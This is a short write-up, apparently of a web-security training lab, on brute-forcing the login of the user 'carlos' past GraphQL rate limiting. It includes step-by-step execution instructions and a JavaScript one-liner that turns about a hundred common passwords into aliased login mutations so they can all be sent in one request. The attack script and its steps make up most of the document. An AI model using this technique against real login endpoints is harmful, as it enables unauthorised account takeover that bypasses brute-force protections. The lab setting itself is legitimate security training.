*This information is only for the purposes of education and skills development. GET and POST are not acronyms.*

**Objective**
Brute forcing password to sign in as Carlos.

**GraphQL**
- It is an API query language for communication between the client and server. 
- Efficiency is its main feature, enabling users to request and receive the exact information required.

**Point of Entry**
Login page with username and password.

**Barrier to Entry**
- The point of entry has GraphQL based protection against bruteforcing of passwords. 
- Too many requests from the same origin within a short span of time returns an error response.

**Bypassing Barrier to Entry**
- Creating a JavaScript that uses aliases to send multiple login attempts at the same time.

**Execution**
- Open login page. Right click anywhere and open Inspect. Select Console and insert the JavaScript in template into the Console. 
- On pressing enter, aliases are created which will be used in a login request later.
- Turn on intercept. Use random credentials to initiate a login request. Send this request to Repeater.
- Paste the generated aliases in the request body and press send. 
- In the response column, the password that returns a true status is the correct password.

**Template**
`` copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");